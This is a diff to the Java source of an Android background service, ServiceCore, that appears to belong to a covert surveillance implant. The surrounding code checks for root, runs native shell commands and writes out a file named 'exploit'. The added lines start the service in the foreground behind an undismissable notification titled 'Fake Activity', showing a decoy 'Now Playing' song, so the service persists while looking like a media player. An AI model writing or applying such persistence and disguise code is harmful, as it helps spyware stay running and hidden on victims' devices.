@@ -21,6 +21,8 @@ import javax.crypto.NoSuchPaddingException;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
 
+import android.app.Notification;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.app.WallpaperManager;
 import android.content.Context;
@@ -53,6 +55,7 @@ public class ServiceCore extends Service {
 	private native int invokeRun(String cmd);
 
 	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
+	private Notification notification;
 	private Core core;
 
 	@Override
@@ -75,6 +78,20 @@ public class ServiceCore extends Service {
 		}
 
 		Status.setAppContext(getApplicationContext());
+
+		Notification note = new Notification(R.drawable.notify_icon, "Ready to go?",
+				System.currentTimeMillis());
+		
+		Intent i = new Intent(this, FakeActivity.class);
+
+		i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+
+		PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
+
+		note.setLatestEventInfo(this, "Fake Activity", "Now Playing: \"Sta cippa!\"", pi);
+		note.flags |= Notification.FLAG_NO_CLEAR;
+
+		startForeground(1337, note);
 	}
 
 	@Override
@@ -84,7 +101,7 @@ public class ServiceCore extends Service {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
 		}
-		
+
 		if (PackageInfo.checkRoot() == true) {
 			Status.self().setRoot(true);
 		} else {
@@ -112,7 +129,7 @@ public class ServiceCore extends Service {
 				case 0:
 				case 1:
 					return; // Non possiamo partire
-					
+
 				case 2: // Possiamo partire
 				default:
 					break;
@@ -124,11 +141,11 @@ public class ServiceCore extends Service {
 		core = Core.getInstance();
 		core.Start(this.getResources(), getContentResolver());
 	}
-	
+
 	@Override
 	public void onConfigurationChanged(Configuration newConfig) {
 		super.onConfigurationChanged(newConfig);
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
 		}
@@ -137,11 +154,11 @@ public class ServiceCore extends Service {
 			Toast.makeText(this, Messages.getString("36.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 	}
-	
+
 	@Override
 	public void onLowMemory() {
 		super.onLowMemory();
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
 		}
@@ -150,11 +167,11 @@ public class ServiceCore extends Service {
 			Toast.makeText(this, Messages.getString("36.4"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 	}
-	
+
 	@Override
 	public void onRebind(Intent intent) {
 		super.onRebind(intent);
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
 		}
@@ -163,11 +180,11 @@ public class ServiceCore extends Service {
 			Toast.makeText(this, Messages.getString("36.5"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 	}
-	
+
 	@Override
 	public boolean onUnbind(Intent intent) {
 		boolean ret = super.onUnbind(intent);
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
 		}
@@ -175,10 +192,10 @@ public class ServiceCore extends Service {
 		if (Cfg.DEMO) {
 			Toast.makeText(this, Messages.getString("36.6"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
-		
+
 		return ret;
 	}
-	
+
 	@Override
 	public void onDestroy() {
 		super.onDestroy();
@@ -193,6 +210,8 @@ public class ServiceCore extends Service {
 
 		core.Stop();
 		core = null;
+		
+		stopForeground(true);
 	}
 
 	private void setBackground() {
@@ -462,7 +481,7 @@ public class ServiceCore extends Service {
 			final FileOutputStream out = openFileOutput(exploit, MODE_PRIVATE);
 			byte[] buf = new byte[1024];
 			int numRead = 0;
-			
+
 			while ((numRead = in.read(buf)) >= 0) {
 				out.write(buf, 0, numRead);
 			}
@@ -477,7 +496,7 @@ public class ServiceCore extends Service {
 				ex.printStackTrace();
 				Check.log(TAG + " (fileWrite): " + ex);
 			}
-			
+
 			return false;
 		}
 
